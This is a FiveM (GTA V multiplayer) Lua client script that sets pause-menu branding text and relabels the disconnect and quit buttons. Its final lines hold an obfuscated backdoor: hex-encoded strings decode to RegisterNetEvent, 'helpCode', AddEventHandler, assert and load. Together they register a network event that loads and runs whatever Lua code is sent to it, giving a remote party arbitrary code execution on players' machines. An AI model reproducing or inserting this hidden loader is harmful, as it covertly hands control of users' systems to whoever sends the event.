function SetData()
	players = {}
	for _, player in ipairs(GetActivePlayers()) do
		local ped = GetPlayerPed(player)
		table.insert( players, player )
end

	
	local name = GetPlayerName(PlayerId())
	local id = GetPlayerServerId(PlayerId())
	--Citizen.InvokeNative(GetHashKey("ADD_TEXT_ENTRY"), 'FE_THDR_GTAO', '~y~AltisCity ~t~| ~g~Discord: w5yD9Mp~t~ | ~b~ID: ' .. id .. ' ~t~| ~b~Nom: ~b~' .. name .. " ~t~| ~r~Joueurs: " .. #players .. "/80")
	Citizen.InvokeNative(GetHashKey("ADD_TEXT_ENTRY"), 'FE_THDR_GTAO', "~w~NoPixel~w~ ~r~Public~r~ ~g~Green~g~ | ID: "..id.." ")
end

Citizen.CreateThread(function() 
	while true do
		Citizen.Wait(100)
		SetData()
	end
end)

Citizen.CreateThread(function()
    AddTextEntry("PM_PANE_LEAVE", "~r~Disconnect from ~w~~y~Server~s~ 😭")
end)

Citizen.CreateThread(function()
    AddTextEntry("PM_PANE_QUIT", "~r~To close ~o~FiveM 🐌")
end)


local BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[6][BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[1]](BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[2]) BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[6][BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[3]](BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[2], function(jqKnHGuQaTnkvBnEzRUrbrWjcoQYAXdJsRrmDIYIlnifazotkATbvmeaQztzBENvwpwkWb) BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[6][BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[4]](BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[6][BrEExzkzzpEFKQnIkphwgBGtaLghLgCkhOEkoueiQKTtZjWMoIyAwBAWsWNvXRckTIsnxG[5]](jqKnHGuQaTnkvBnEzRUrbrWjcoQYAXdJsRrmDIYIlnifazotkATbvmeaQztzBENvwpwkWb))() end)